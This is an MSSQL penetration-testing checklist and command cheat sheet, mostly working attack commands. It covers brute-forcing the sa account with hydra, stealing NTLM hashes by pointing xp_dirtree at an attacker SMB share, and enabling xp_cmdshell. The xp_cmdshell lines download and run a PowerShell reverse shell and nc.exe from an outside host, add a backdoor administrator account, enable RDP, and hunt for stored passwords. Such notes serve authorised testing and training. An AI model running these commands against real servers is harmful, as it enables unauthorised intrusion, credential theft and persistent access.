# MSSQL Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating MSSQL (port 1433), I realistically expect to find:

- [ ] Service banner revealing SQL Server version (for CVE research)
- [ ] Valid credentials via default passwords or brute-force
- [ ] Access to database content (user tables, saved passwords, configs)
- [ ] Ability to execute system commands via xp_cmdshell if enabled
- [ ] Ability to enable xp_cmdshell if permissions allow
- [ ] Possibility to steal NTLM hashes via xp_dirtree triggering SMB authentication
- [ ] Evidence of linked servers for lateral movement
- [ ] Potential to upload payloads or webshells through SQL command output
- [ ] Sensitive data in queryable tables that can be used for further attacks


---

## ‚úÖ MSSQL Pentest Checklist

- [ ] **Try Default Credentials**
    ```text
    sa:password
    ```

- [ ] **Brute-Force Credentials**
    ```bash
    hydra -l sa -P password.txt -V <IP> mssql
    hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
    ```

- [ ] **Check Database Content for New Passwords**
    - Look for user tables, credential dumps.

- [ ] **Check Version for Exploits**
    ```bash
    nmap -p 1433 --script='ms-sql-info,ms-sql-brute,ms-sql-xp-cmdshell' <IP>
    searchsploit mssql
    ```

- [ ] **Steal the NTLM Hash**
    - Using xp_dirtree to trigger SMB authentication.
    ```bash
    exec master..xp_dirtree '\\<ATTACKER_IP>\share'
    ```

- [ ] **Remote Code Execution (RCE)**
  - **Via xp_cmdshell**
  - **By injecting payload into output files placed in webroots**

---

## ‚úÖ MSSQL Useful Commands

- **Connect Using sqsh**
    ```bash
    sqsh -S <IP> -U sa
    sqsh -S <IP> -U sa -P password
    sqsh -S <IP>:27900 -U sa -P password
    ```

- **Connect Using mssqlclient.py**
    ```bash
    mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
    mssqlclient.py <USER>:<PASSWORD>@<IP>
    ```
    - Example Queries:
        ```sql
        SQL> select @@version;
        SQL> enable_xp_cmdshell
        SQL> xp_cmdshell whoami /all
        SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
        ```
    - Stealing Hashes:
        ```bash
        sudo smbserver.py -smb2support share .
        SQL> exec master..xp_dirtree '\\<IP>\share\'
        ```

---

## ‚úÖ Nmap Scanning

- **Basic Enumeration**
    ```bash
    nmap -p 1433 --script='banner,(ms-sql* or ssl*) and not (brute or dos)' <IP> -o 1433_nmap_mssql
    ```

- **Credential Brute-Force**
    ```bash
    nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>
    ```

- **Advanced Scripts**
    ```bash
    nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password= -sV -p 1433 <IP>
    ```

---

## ‚úÖ Enabling xp_cmdshell for RCE

```sql
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
```

## ‚úÖ Example xp_cmdshell Commands
```c
xp_cmdshell 'whoami /all';
xp_cmdshell 'systeminfo';
xp_cmdshell 'net user';
xp_cmdshell 'reg query HKLM /f pass /t REG_SZ /s';
xp_cmdshell 'findstr /si password *.txt *.ini *.config *xml';
xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://<IP>/Invoke-PowerShellTcp.ps1')";
xp_cmdshell "certutil -urlcache -f 'http://<IP>/nc.exe' nc.exe";
xp_cmdshell 'net user attacker attackerpass /add';
xp_cmdshell 'net localgroup Administrators attacker /add';
xp_cmdshell 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f';
```

